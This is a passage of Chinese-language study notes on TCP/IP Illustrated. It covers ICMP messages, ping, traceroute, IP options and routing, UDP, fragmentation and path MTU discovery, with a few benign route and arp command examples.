<p>这些规则是为了防止过去允许ICMP差错报文对广播分组响应所带来的广播风暴。</p>
<h2 id="ICMP地址掩码请求与应答"><a href="#ICMP地址掩码请求与应答" class="headerlink" title="ICMP地址掩码请求与应答"></a>ICMP地址掩码请求与应答</h2><p>ICMP地址掩码请求用于无盘系统在引导过程中获取自己的子网掩码。系统广播它的ICMP请求报文，报文格式如图6-4所示：</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/201922374028201.png" alt=""></p>
<p>说明：</p>
<ul>
<li>标识符和序列号字段由发送端任意选择设定，这些值在应答中将被返回。这样，发送端就可以把应答与请求进行匹配。</li>
<li>广播的定义是指局域网上的所有主机，因此它必须包括发送主机在内。当以太网驱动程序识别出目的地址是广播地址后，它就把分组送到网络上，同时传一份拷贝到环回接口。</li>
<li>通常，应答地址必须是单播地址，除非请求端的源IP地址是0.0.0.0。</li>
</ul>
<h3 id="ICMP时间戳请求与应答"><a href="#ICMP时间戳请求与应答" class="headerlink" title="ICMP时间戳请求与应答"></a>ICMP时间戳请求与应答</h3><p>ICMP时间戳请求允许系统向另一个系统查询当前的时间。返回的建议值是自午夜开始计算的毫秒数，协调的统一时间(Coordinated Universal Time, UTC)。</p>
<p>说明：</p>
<ul>
<li>这种报文的好处是：提供了毫秒级的分辨率，而利用其他方法从别的主机获取的时间（如某些Unix系统提供的rdate命令）只能提供秒级的分辨率。</li>
<li>缺陷是：返回的时间是从午夜开始计算的，因此调用者必须通过其他方法获知当时的日期。</li>
</ul>
<p>ICMP时间戳请求和应答报文格式如图6-6所示：</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/201955518555818.png" alt=""></p>
<p>请求端填写发起时间戳，然后发送报文。应答系统收到请求报文时填写接收时间戳，在发送应答时填写发送时间戳。</p>
<h2 id="ICMP端口不可达差错"><a href="#ICMP端口不可达差错" class="headerlink" title="ICMP端口不可达差错"></a>ICMP端口不可达差错</h2><p>端口不可达报文是一种ICMP差错报文，它是ICMP目的不可到达报文中的一种。ICMP不可达报文的一般格式如图6-10所示。</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/202037158396912.png" alt=""></p>
<p>说明：</p>
<ul>
<li>ICMP的一个规则是：ICMP差错报文必须包括生成该差错报文的数据报IP首部（包含任何选项），还必须至少包括跟在该IP首部后面的前8个字节。</li>
<li>导致差错的数据报中的IP首部要被送回的原因是因为IP首部中包含了协议字段，使得ICMP可以知道如何解释后面的8个字节。TCP和UDP首部的前8个字节包括源端口和目的端口。</li>
</ul>
<p>ICMP覆盖的范围很广，从致命差错到信息差错，即使在一个给定的系统实现中，对每个ICMP报文的处理都是不相同的。</p>
<h2 id="ICMP报文的4-4BSD处理"><a href="#ICMP报文的4-4BSD处理" class="headerlink" title="ICMP报文的4.4BSD处理"></a>ICMP报文的4.4BSD处理</h2><p>由于ICMP覆盖的范围很广，从致命差错到信息差错，因此即使在一个给定的系统实现中，对每个ICMP报文的处理都是不相同的。<br><img src="http://img.blog.csdn.net/20150414163431439" alt=""></p>
<ul>
<li>如果最后一列标明是“内核”，那么ICMP就由内核来处理</li>
<li>如果最后一列指明是“用户进程”，那么报文就被传送到所有在内核中登记用户进程，以读取收到的ICMP报文</li>
<li>如果不存在任何这样的用户进程，那么报文就悄悄地被丢弃（这些用户进程还会收到所有其它类型的ICMP报文的拷贝，虽然它们应该由内核来处理，当然用户进程只有在内核处理以后才能收到这些报文）。有一些报文完全被忽略</li>
<li>如果最后一列标明的是引号内的一串字符，那么它就是对应的Unix差错。</li>
</ul>
<h1 id="Ping程序"><a href="#Ping程序" class="headerlink" title="Ping程序"></a>Ping程序</h1><h2 id="Ping介绍"><a href="#Ping介绍" class="headerlink" title="Ping介绍"></a>Ping介绍</h2><ul>
<li>“ping”这个名字源于声纳定位操作。Ping程序由Mike Muuss编写，目的是为了测试另一台主机是否可达。该程序发送一份ICMP回显请求报文给主机，并等待返回ICMP回显应答</li>
<li>可以用Ping程序来确定问题出在哪里。Ping程序还能测出到这台主机的往返时间，以表明该主机离我们有多远</li>
<li>一台主机的可达性可能不只取决于IP层是否可达，还取决于使用何种协议以及端口号。Ping程序的运行结果可能显示某台主机不可达，但我们可以用Telnet远程登录到该台主机是25号端口</li>
</ul>
<h2 id="Ping程序-1"><a href="#Ping程序-1" class="headerlink" title="Ping程序"></a>Ping程序</h2><p><img src="http://obr4sfdq7.bkt.clouddn.com/uknow4.jpg" alt=""></p>
<ul>
<li>称发送回显请求的ping程序为客户，而称被ping的主机为服务器。大多数的TCP|IP实现都在内核中直接支持Ping服务器–这种服务器不是一个用户进程</li>
<li>对于其他类型的ICMP查询报文，服务器应该响应标识符和序列号字段。另外，客户发送的选项数据必须回显，假设客户对这些信息都会感兴趣</li>
<li>Unix系统在实现ping程序时是把ICMP报文中的标识符字段置成发送进程的ID号。这样即使在同一台主机上同时运行了多个ping程序实例，ping程序也可以识别出返回的信息</li>
<li>在windows下，不管开多个窗口ping的identifier都是相同的，而且每增加一个出去的ping包序列号增加256</li>
</ul>
<h2 id="IP记录路由选项"><a href="#IP记录路由选项" class="headerlink" title="IP记录路由选项"></a>IP记录路由选项</h2><p><img src="http://obr4sfdq7.bkt.clouddn.com/uknow5.jpg" alt=""></p>
<ul>
<li>大多数不同版本的ping程序都提供-R选项，以提供记录路由的功能。它使得[ing程序在发送出来的IP数据报中设置IPRR选项（该IP数据报包含ICMP回显请求报文）。这样，每个处理该数据报的路由器都把它的IP地址放入选项字段中。当数据报到达目的端时，IP地址清单应该赋值到ICMP回显应答中，这样返回途中所经过的路由器地址也被加入清单中。当Ping程序收到回显应答时，它就打印出这份IP地址清单</li>
<li>源端主机生成RR选项，中间路由器对RR选项的处理，以及把ICMP回显请求中的RR清单复制到ICMP回显应答中，所有这些都是选项功能。幸运的是，现在的大多数系统都支持这些选项功能，只能有一些系统不把ICMP请求的IP清单赋值到ICMP应答中。</li>
<li>但是，最大的问题是IP首部中只有有限的空间来存放IP地址。IP首部中的首部长度字段只有4bit，因此整个IP首部最长只能包括15个32bit长的字（即60个字节）。由于IP首部固定长度为20字节，RRR选项用去3个字节，这样只剩下37个字节（60-20-3）来存放IP地址清单，也就是说只能存放9个IP地址</li>
</ul>
<h2 id="IP时间戳选项"><a href="#IP时间戳选项" class="headerlink" title="IP时间戳选项"></a>IP时间戳选项</h2><p><img src="http://obr4sfdq7.bkt.clouddn.com/uknow3.jpg" alt=""></p>
<ul>
<li>时间戳选项的代码为0x44。其他两个字段len和ptr与记录路由选项相同：选项的总长度（一般为36或40）和指向下一个可用时间的指针（5，9，13等）</li>
<li>接下来的两个字段是4bit的值：OF表示溢出字段，FL表示标志字段。时间戳选项的操作</li>
<li>时间戳的取值一般为自UTC午夜开始计的毫秒数，与ICMP时间戳请求和应答相类似。如果路由器不使用这种格式，它就可以插入任何它使用的时间表示格式，但是必须打开时间戳中的高位以表明为非标准值</li>
<li>与我们遇到的记录路由选项所受到的限制相比，时间戳选项遇到情况要更坏一些。如果我们要同时记录IP地址和时间戳（标志位为1），那么就可以同时存入其中的四对值。只记录时间戳是没有用处的，因为没有标明时间戳与路由器之间的对应关系</li>
</ul>
<h1 id="Traceroute程序"><a href="#Traceroute程序" class="headerlink" title="Traceroute程序"></a>Traceroute程序</h1><ul>
<li>由Van Jacobson编写的Traceroute程序是一个能更深入探索TCP|IP协议的方便可用的工具</li>
<li>Traceroute程序可以让我们看到IP数据报从一台主机传到另一台主机所经过的路由</li>
<li>Traceroute程序还可以让我们使用IP源路由选项</li>
</ul>
<h2 id="Traceroute和IP路径记录选项的比较"><a href="#Traceroute和IP路径记录选项的比较" class="headerlink" title="Traceroute和IP路径记录选项的比较"></a>Traceroute和IP路径记录选项的比较</h2><p>我们描述了IP记录路由选项（RR）。为什么不使用这个选项而另外开发一个新的应用程序？有三个方面的原因。</p>
<ul>
<li>首先，原先并不是所有的路由器都支持记录路由选项，因此该选项在某些路径上不能使用（Traceroute程序不需要中间路由器具备任何特殊的或可选的功能）</li>
<li>其次，记录路由一般是单向的选项。发送端设置了该选项，那么接收端不得不从收到的IP首部中提取所有的信息，然后全部返回给发送端.大多数Ping服务器的实现（内核中的ICMP回显应答功能）把接收到的RR清单返回，但是这样使得记录下来的IP地址翻了一番（一来一回）。</li>
<li>最后一个原因也是最主要的原因是，IP首部中留给选项的空间有限，不能存放当前大多数的路径</li>
</ul>
<h2 id="Traceroute程序的操作"><a href="#Traceroute程序的操作" class="headerlink" title="Traceroute程序的操作"></a>Traceroute程序的操作</h2><ul>
<li>Traceroute程序使用ICMP报文和IP首部中的TTL字段（生存周期）。TTL字段是由发送端初始设置一个8bit字段。推荐的初始值由分配数字RFC指定，当前值为64.较老版本的系统经常初始化为15或32.发送ICMP回显应答时经常把TTL设为最大值255</li>
<li>每个处理数据报的路由器都需要把TTL的值减1或减去数据报在路由器中停留的秒数。由于大多数的路由器转发数据报的时延都小于1秒钟，因此TTL最终成为一个跳站的计数器，所经过的每个路由器都将其值减1</li>
<li>当路由器收到一份IP数据报，如果其TTL字段是0或1，则路由器不转发该数据报（接收到这种数据报的目的主机可以将它交给应用程序，这是因为不需要转发该数据报。但是在通常情况下，系统不应该接收TTL字段为0的数据报）。相反，路由器将该数据报丢弃，并给信源机发一份ICMP“超时”信息。Traceroute程序的关键在于包含这份ICMP信息的IP报文的信源地址是该路由器的IP地址</li>
<li>Traceroute程序发送一份UDP数据报给目的主机，但它选择一个不可能的值作为UDP端口号（大于3000），使目的主机的UDP模块产生一份“端口不可达”错误的ICMP报文。这样，Traceroute程序所要做的就是区分接收到的ICMP报文是超时还是端口不可达，以判断什么时候结束。</li>
</ul>
<h2 id="IP源选路选项"><a href="#IP源选路选项" class="headerlink" title="IP源选路选项"></a>IP源选路选项</h2><p>源站选项（source routing）的思想是由发送者指定路由，它可以采用以下两种形式：</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/uknow.jpg" alt=""></p>
<ul>
<li>严格的源路由选择。发送端指明IP数据报所必须采用的确切路由。如果一个路由器发现源路由所指定的下一个路由器不在其直接连接的网络上，那么它就返回一个“源路路由失败”的ICMP差错报文</li>
<li>宽松的源站选路，发送端指明了一个数据报经过的IP地址清单，但是数据报在清单上指明的任意两个地址之间可以通过其他路由器</li>
<li>这个格式与记录路由选项格式基本一致。不同之处是，对于源站选路，我们必须在发送IP数据报前填充IP地址清单；而对于记录路由选项，我们需要为IP地址清单分配并清空一些空间，并让路由器填充该清单中各项。同时，对于源站选路，只要为所需要的IP地址数分配空间并进行初始化，通常其数量小于9.而对于记录路由选项来说，必须尽可能地分配空间，以达到9个地址</li>
<li>对于宽松的源站来说，code字段的值是0x83；而对于严格的源站选路，其值为0x89.len和ptr字段与IP首部中的记录路由选项的一般格式是一样的</li>
</ul>
<h2 id="IP源站选路的操作机制"><a href="#IP源站选路的操作机制" class="headerlink" title="IP源站选路的操作机制"></a>IP源站选路的操作机制</h2><p>源站路由选项的实际称呼为“源站及记录路由”（对于宽松的源站选路和严格的源路选路，分别用LSRR和SSRR表示），这是因为在数据报沿路由发送过程中，对IP地址清单进行了更新。下面是其运行过程：</p>
<ul>
<li>发送主机从应用程序接收源站路由清单，将第1个表项去掉（它是数据报的最终目的地址），将剩余的项移到1个项中，并将原来的目的地址作为清单的最后一项。指针仍然指向清单的第1项（即，指针的值为4）</li>
<li>每个处理数据报的路由器检查其是否为数据报的最终地址。如果不是，则正常转发数据报（在这种情况下，必须指明宽松源站选路，否则就不能接收到该数据报）</li>
<li>如果该路由器是最终目的，且指针不大于路径的长度，那么（1）由ptr所指定的清单中的下一个地址就是数据报的最终目的地址；（2）由外接口响应的IP地址取代刚才使用的源地址；（4）指针加4</li>
<li>Host Requirements RFC指明，TCP客户必须能指明源站选路，同时，TCP服务器必须能够接收源站选路，并且对于该TCP连接的所有报文段都能采用反向路由。如果TCP服务器下面接收到一个不同的源站选路，那么新的源路路由将取代旧的源路路由</li>
</ul>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/uknow1.jpg" alt=""></p>
<h1 id="IP选路"><a href="#IP选路" class="headerlink" title="IP选路"></a>IP选路</h1><ul>
<li>选路是IP最重要的功能之一</li>
<li>路由守护程序（daemon），通常这是一个用户进程</li>
<li>在Unix系统中，大多数普通的守护程序都是路由程序和网关程序</li>
<li>路由表经常被IP访问，但是它被路由守护程序更新的频度却要低得多</li>
<li>当接收到ICMP重定向报文时，路由表也要被更新</li>
<li><p>用netstat命令来显示路由表</p>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170421202212.jpg" alt=""></p>
</li>
</ul>
<h2 id="选路的原理"><a href="#选路的原理" class="headerlink" title="选路的原理"></a>选路的原理</h2><p>IP搜索路由表的几个步骤：</p>
<ul>
<li>搜索匹配的主机地址</li>
<li>搜索匹配的网络地址</li>
<li>搜索默认表项（默认表项一般在路由表中被指定为一个网络表项，其网络号为0）</li>
<li>CISCO的选路策略（1.明细策略路由 2.明细路由 3.策略默认路由 4.默认路由）</li>
<li>IP执行选路机制，而路由守护程序则一般提供选路策略</li>
</ul>
<h2 id="初始化路由表"><a href="#初始化路由表" class="headerlink" title="初始化路由表"></a>初始化路由表</h2><ul>
<li>每当初始化一个接口时（通常是用ifconfig命令设置接口地址），就为接口自动创建一个直接路由。对于点对点链路和环回接口来说，路由是到达主机（例如，设置H标志）。对于广播接口来说，如以太网，路由是到达网络</li>
<li>到达主机或网络的路由如果不是直接相连的，那么就必须加入路由表</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">route add default sun 1</div><div class="line">route add slip bsdi 1</div><div class="line">route add 1.1.1.0 mask 255.255.255.0 1.1.1.1</div></pre></td></tr></table></figure>
<ul>
<li>第三个参数（defalut和slip）代表目的端，第四个参数代表网关（路由器），最后一个参数代表路由的度量（metric）.route命令在度量值大于0时要为该路由设置G标志，否则，当耗费值为0时就不设置G标志</li>
</ul>
<h2 id="转发或不转发"><a href="#转发或不转发" class="headerlink" title="转发或不转发"></a>转发或不转发</h2><ul>
<li>一般都假定主机不转发IP数据报，除非对它们进行特殊配置而作为路由器使用</li>
<li>大多数伯克利派出来的系统都有一个内核变量ipforwarding</li>
<li>SumOS 4.1.x允许该变量可以有三个不同的值：-1表示始终不转发并且始终不改变它的值；0表示默认条件下不转发，但是当打开两个或更多个接口时就把值设为1；1表示始终转发。Solaris 2.x把这个值改为0（始终不转发）’1（始终转发）和2（在打开两个或更多个接口是才转发）</li>
<li>较早版本的4.2BSD主机在默认条件下可以转发数据报，这给没有进行正确配置的系统带来了许多问题。这就是内核选项为什么要设成默认的“始终不转发”的原因，除非系统管理员进行特殊设置</li>
</ul>
<h2 id="ICMP重定向差错"><a href="#ICMP重定向差错" class="headerlink" title="ICMP重定向差错"></a>ICMP重定向差错</h2><ul>
<li>我们假定主机发送一份IP数据报给R1.这种选路决策经常发生，因为R1是该主机的默认路由</li>
<li>R1收到数据报并检查它的路由表，发现R2是发送数据报的下一站。当它把数据报发送给R2时，R1检测到它正在发送的接口与数据报达到接口是相同的（即主机和两个路由器所在的LAN）。这样就给路由器发送重定向报文给原始发送端提供了线索</li>
<li>R1发送一份ICMP重定向报文给主机，告诉它以后把数据报发送给R2而不是R1</li>
</ul>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170422232852.jpg" alt=""></p>
<h1 id="UDP：用户数据报协议"><a href="#UDP：用户数据报协议" class="headerlink" title="UDP：用户数据报协议"></a>UDP：用户数据报协议</h1><h2 id="UDP介绍"><a href="#UDP介绍" class="headerlink" title="UDP介绍"></a>UDP介绍</h2><ul>
<li>UDP是一个简单的面向数据报的运输层协议：进程的每个输出操作都正好产生一个UDP数据报，并组装成一份待发送的IP数据包</li>
<li>这与面向流字符的协议不同，如TCP，应用程序产生的全体数据与真正发送的单个IP数据报可能没什么联系</li>
<li>UDP不提供可靠性：它把应用程序传给IP层的数据发送出去，但是并不保证它们能到达目的地</li>
<li>应用程序必须关心IP数据报的长度。如果它超过网络的MTU，那么就要对IP数据报进行分片</li>
</ul>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/211857142503378.png" alt=""></p>
<h2 id="UDP三大典型运用"><a href="#UDP三大典型运用" class="headerlink" title="UDP三大典型运用"></a>UDP三大典型运用</h2><h3 id="查询类：DNS"><a href="#查询类：DNS" class="headerlink" title="查询类：DNS"></a>查询类：DNS</h3><ul>
<li>没有TCP三次握手包过程，快</li>
<li>多个DNS同时查询</li>
</ul>
<h3 id="数据传输：TFTP"><a href="#数据传输：TFTP" class="headerlink" title="数据传输：TFTP"></a>数据传输：TFTP</h3><ul>
<li>停止等待协议，慢（需运用层确定数据）</li>
<li>适合无盘工作站</li>
</ul>
<h3 id="语言视频流"><a href="#语言视频流" class="headerlink" title="语言视频流"></a>语言视频流</h3><ul>
<li>支持广播和组播</li>
<li>支持丢包，保障效率</li>
</ul>
<h2 id="UDP首部"><a href="#UDP首部" class="headerlink" title="UDP首部"></a>UDP首部</h2><p><img src="http://images.cnitblog.com/blog2015/697266/201504/211907360933802.png" alt=""></p>
<ul>
<li>端口号表示发送进程和接收进程</li>
<li>TCP端口号与UDP端口号是相互独立的。（rsh和syslog=514）</li>
<li>尽管相互独立，如果TCP和UDP同时提供某种知名服务，两个协议通常选择相同的端口号。这纯粹是为了使用方便，而不是协议本事的要求（dns）</li>
<li>UDP长度字段指的是UDP首部和UDP数据的字节长度。该字段的最小值为8字节</li>
</ul>
<h2 id="UDP检验和"><a href="#UDP检验和" class="headerlink" title="UDP检验和"></a>UDP检验和</h2><ul>
<li>UDP检验和覆盖UDP首部和UDP数据</li>
<li>IP首部的检验和，它只覆盖IP的首部</li>
<li>UDP的检验和是可选的，而TCP的检验和是必需的</li>
<li>IP计算检验和和UDP计算检验和之间存在不同的地方。首先，UDP数据报的长度可以为奇数字节，但检验和算法是把若干个16bit字相加。解决方法是必要时在最后增加填充字节0，这只是为了检验和的计算（也就是说，可能增加的填充字节不被传送）</li>
<li>UDP数据报和TCP段都包含一个12字节长的伪首部，它是为了计算检验和而设置的。伪首部包含IP首部一些字段。其目的是让UDP两次检查数据是否已经正确到达目的地（例如，IP没有接受地址不是本主机的数据报，以及IP没有把应传给另一高层的数据报传给UDP）</li>
</ul>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/211955147184376.png" alt=""></p>
<h2 id="tcpdump输出"><a href="#tcpdump输出" class="headerlink" title="tcpdump输出"></a>tcpdump输出</h2><p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE2017042317114.jpg" alt=""></p>
<ul>
<li>三个系统有两个打开了UDP检验和选项</li>
<li>送出的数据报与收到的数据报具有相同的检验和值（第3和第4行，第5和第6行）。从图11-3可以看出，两个IP地址进行了交换，正如两个端口号一样。伪首部和UDP首部中的其他字段都是相同的，就想数据回显一样。这再次表明UDP检验和（事实上，TCP|IP协议簇中所有的检验和）是简单的16bit和。它们检测不出交换两个16bit的差错</li>
</ul>
<h2 id="一个简单的例子"><a href="#一个简单的例子" class="headerlink" title="一个简单的例子"></a>一个简单的例子</h2><p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170423172522.jpg" alt=""></p>
<ul>
<li>在发送第一份数据报之前，发送端和接收端之间没有任何通信</li>
<li>当收到数据时，接收端没有任何确认。在这个例子中，发送端并不知道零一端是否已经收到这些数据报</li>
<li>每次运行程序时，源端的UDP端口号都发生变化。第一次是1108，然后是1110.客户程序使用ephemeral端口号一般在1024~5000之间</li>
</ul>
<h2 id="IP分片"><a href="#IP分片" class="headerlink" title="IP分片"></a>IP分片</h2><ul>
<li>IP把MTU与数据报长度进行比较</li>
<li>如果需要则进行分片。分片可以发生在原始发送端主机上，也可以发送在中间路由器上。</li>
<li>把一份IP数据报分片以后，只有到达目的地才进行重新组装（FR fragment）</li>
<li>重新组装由目的端的IP层来完成，其目的是使分片和重新组装过程对运输层（TCP和UDP）是透明的</li>
<li>已经分片过的数据报有可能会再次进行分片（可能不止一次）</li>
<li>当IP数据报被分片后，每一片都成为一个分组，具有自己的IP首部中有足够的信息让接收端能正确组装这些数据报片</li>
<li>尽管IP分片过程看起来是透明的，但有一点让人不想使用它：即使只丢失一片数据也要重传整个数据报</li>
<li>IP层本身没有超时重传的机制–由更高层来负责超时和重传（TCP有超市和重传机制，但UDP没有。一些UDP应用程序本身也执行超时和重传）。当来自TCP报文段的某一片丢失后，TCP在超时后会重发整个TCP报文段，该报文段对应于一份IP数据报。没有办法只能重传数据报中的一个数据报片</li>
<li>如果对数据报分片的是中间路由器，而不是启事端系统，那么起始端系统就无法知道数据报是如何被分片的。就这个原因，要经常避免分片</li>
</ul>
<h3 id="IP分片：注意事项"><a href="#IP分片：注意事项" class="headerlink" title="IP分片：注意事项"></a>IP分片：注意事项</h3><ul>
<li>在分片时，除最后一片外，其他每一片中的数据部分（除IP首部外的其余部分）必须是8字节的整数倍</li>
<li>IP首部被复制到各个片中。但是，端口号在UDP首部，只能在第一片中被发现</li>
<li>需要解释几个术语：IP数据报是指IP层端到端的传输单元（在分片之前和重新组装之后），分组是指在IP层和链路层之间的数据单元，一个分组可以是一个完整的IP数据报，也可以是IP数据报的一个分片</li>
</ul>
<h2 id="ICMP不可达差错（需要分片）"><a href="#ICMP不可达差错（需要分片）" class="headerlink" title="ICMP不可达差错（需要分片）"></a>ICMP不可达差错（需要分片）</h2><p><img src="http://images.cnitblog.com/blog2015/697266/201504/212127065468647.png" alt=""></p>
<ul>
<li>发生ICMP不可达差错的另一种情况是，当路由器收到一份需要分片的数据报，而在IP首部又设置了不分片(DF的标志比特。如果某个程序需要判断到目的端的路途中最小MTU是多少–称作路径MTU发现机制，那么这个差错就可以被该程序使用</li>
<li>如果路由器没有提供这种新的ICMP差错报文格式，那么下一站的MTU就设为0</li>
</ul>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170424210136.jpg" alt=""></p>
<ul>
<li>在点到点的链路中，不要求两个方向的MTU为相同值</li>
<li>在主机sun上运行tcpdump，观察SLIP链路，看什么时候发生分片。开始没有观察到分片，一切都很正常知道ping分组的数据长度从500增加到600字节。可以看到接收到的回显请求（仍然没有分片），但不见回显应答</li>
<li>Ping的时候DF置位（echo设置DF位，echo-reply也会设置DF位）</li>
</ul>
<h2 id="用Traceroute确定路径MTU"><a href="#用Traceroute确定路径MTU" class="headerlink" title="用Traceroute确定路径MTU"></a>用Traceroute确定路径MTU</h2><p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170424205607.jpg" alt=""></p>
<ul>
<li>MTU值的个数是有限的，因此在我们的程序中有些由近似值构成的表，取下一个最小的MTU值来发送</li>
<li>上面的测试中间设备不回送吓一跳的MTU，下面的测试回送了下一跳的MTU</li>
</ul>
<h2 id="采用UDP的路径MTU发现"><a href="#采用UDP的路径MTU发现" class="headerlink" title="采用UDP的路径MTU发现"></a>采用UDP的路径MTU发现</h2><p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170424205406.jpg" alt=""></p>
<ul>
<li>Solaris发送650字节的udp包，并且DF被置位</li>
<li>被bsdi丢弃，但是不回送MTU值</li>
<li>Solaris自以为是的对数据包进行分片（552 106两个片）</li>
</ul>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170424205651.jpg" alt=""><br><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170424205746.jpg" alt=""></p>
<ul>
<li>Solaris自以为是的对数据报进行分片（552 106两个片）造成不优化的再次分片</li>
<li>最好的解决方式是让bsdi回送MTU，Solaris根据这个MTU采取最优化的分片</li>
</ul>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170424205832.jpg" alt=""></p>
<h2 id="UDP和ARP之间的交互作用"><a href="#UDP和ARP之间的交互作用" class="headerlink" title="UDP和ARP之间的交互作用"></a>UDP和ARP之间的交互作用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">bsdi % arp -a验证ARP高速缓存是空的</div><div class="line">bsdi % sock -u -i -l -w8192 svr4 discard</div></pre></td></tr></table></figure>
<p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170424205918.jpg" alt=""></p>
<ul>
<li>1.在第一个ARP应答返回以前，总共产生了6个ARP请求</li>
<li>2.在接收第一个ARP应答时（第7行），只发送最后一个数据报片（第9行）</li>
<li>3.在大多数的实现中，在等待一个ARP应答时，只将最后一个报文发送给特定目的主机</li>
<li>4.另一个无法解释的不正常的现象是，svr4发回7个，而不是6个ARP应答</li>
<li>5.这里我们没有看到ICMP消息的原因有两个。首先，大多数从Berkeley派生的实现从不产生该差错！这些实现会设置定时器，也会在定时器溢出时将数据报片丢弃，但是不生成ICMP差错</li>
<li>6.第二，并未接收到包含UDP首部的偏移量为0的第一个数据报片（这是被ARP所丢弃的5个报文的第一个）除非接收到第一个数据报片，否则并不要求任何实现产生ICMP差错</li>
</ul>
<h2 id="最大UDP数据报长度"><a href="#最大UDP数据报长度" class="headerlink" title="最大UDP数据报长度"></a>最大UDP数据报长度</h2><ul>
<li>IP数据报的最大长度是65535字节，这是由IP首部16比特总长度字段所限制的</li>
<li>我们将遇到两个限制因素，第一，应用程序可能会收到其程序接口的限制。Socket API提供了一个可供应用程序调用的函数，以设置接收和发送缓存的长度。对于UDP socket，这个长度与应用程序可以读写的最大UDP数据报的长度直接相关。现在的大部分系统都默认提供了可读写大于8192字节的UDP数据报（使用这个默认值是因为8192是NFS读写用户数据数的默认值）</li>
<li>第二个限制来自于TCP|IP的内核实现。可能存在一些实现特性（或差错），使IP数据报长度小于65535字节</li>
<li>在SunOS4.1.3下使用环回接口的最大IP数据报长度是32767字节。比它大的值都会发生差错。但是从BSD/386到SunOS4.1.3的情况下，Sun所能接收到最大IP数据报长度为32786字节（即32758字节用户数据）。在Solaris2.2下使用环回接口，最大可收发IP数据报长度为65535字节。从Solaris2.2到AIX3.2.2,发送的最大IP数据报长度可以是65535字节。很显然，这个限制和源端和目的端的实现有关</li>
<li>要求主机必须能够接收最短为576字节的IP数据报，在许多的UDP应用程序的设计中，其应用数据被限制成512字节或更小，因此比这个限制值小</li>
</ul>
<h2 id="ICMP源站抑制差错"><a href="#ICMP源站抑制差错" class="headerlink" title="ICMP源站抑制差错"></a>ICMP源站抑制差错</h2><p>当一个系统（路由器或主机）接收数据报的速度比其处理速度快时，可能产生这个差错。</p>
<p>注意：“可能”产生这个差错。即使一个系统已经没有缓存并丢弃数据报，也不要求它一定要发送源站抑制报文。</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/212155080782897.png" alt=""></p>
<h2 id="UDP服务器的设计"><a href="#UDP服务器的设计" class="headerlink" title="UDP服务器的设计"></a>UDP服务器的设计</h2><p>对于服务器来说，它启动后处于休眠状态，等待客户请求的到来。对于UDP来说，当客户数据报到达时，服务器苏醒过来，数据报中可能包含来自客户的某种形式的请求消息。</p>
<ul>
<li><p>（1）客户IP地址及端口号<br>IP首部包含源端和目的端IP地址，UDP首部包含了源端和目的端的UDP端口号。当一个应用程序接收到UDP数据报时，操作系统必须告诉它是谁发送了这份消息，即源IP地址和端口号。这个特性允许一个交互UDP服务器对多个客户进行处理。给每个发送请求的客户发回应答。</p>
</li>
<li><p>（2）目的IP地址<br>一些应用程序需要知道数据报是发送给谁的，即目的IP地址。这要求操作系统从接收到的UDP数据报中将目的IP地址交给应用程序。</p>
</li>
<li><p>（3）UDP输入队列<br>大多数UDP服务器是交互服务器。这意味着，单个服务器进程对单个UDP端口上（服务器上的名知端口）的所有客户请求进行处理。</p>
</li>
</ul>
<p>通常程序所使用的每个UDP端口都与一个有限大小的输入队列相联系。来自不同客户的差不多同时到达的请求将由UDP自动排队。接收到的UDP数据报以其接收顺序交给应用程序</p>
<p>排队溢出造成内核中的UDP模块丢弃数据报的可能性是存在的。</p>
<p>1）应用程序并不知道其输入队列何时溢出。只是由UDP对超出数据报进行丢弃处理。</p>
<p>2）没有发回任何信息告诉客户其数据报被丢弃。</p>
<ul>
<li>（4）限制本地IP地址<br>大多数UDP服务器在创建UDP端点时都使其本地IP地址具有通配符(wildcard)的特点。表明进入的UDP数据报如果其目的地为服务器端口，那么在任何本地接口均可接收到它。</li>
</ul>
<p>另一方面，当服务器创建端点时，它可以把其中一个主机本地IP地址包括广播地址指定为端点的本地IP地址。只有当目的IP地址与指定的地址相匹配时，进入的UDP数据报才能被送到这个端点。</p>
<ul>
<li>（5）限制远端IP地址</li>
</ul>
<p>大多数系统都允许UDP端点对远端地址进行限制，即端点将只能接收特定IP地址和端口号的UDP数据报。</p>
<ul>
<li>（6）每个端口有多个接收者</li>
</ul>
<p>大多数系统在某一时刻只允许一个程序端点与某个本地IP地址及UDP端口号相关联。当目的地为该IP地址及端口号的UDP数据报到达主机时，就复制一份传给该端点。</p>
<p>然而，在一个支持多播的系统上，多个端点可以使用同一个IP地址和UDP端口号。</p>
<p>当UDP数据报到达的目的IP地址为广播地址或多播地址，而且在目的IP地址和端口号处有多个端点时，就向每个端点传送一份数据报的复制。如果UDP数据报到达的是一个单播地址，那么只向其中一个端点传送一份数据报的复制。选择哪个端点传送数据取决于各个不同的系统实现。</p>
<h1 id="广播与多播"><a href="#广播与多播" class="headerlink" title="广播与多播"></a>广播与多播</h1><ul>
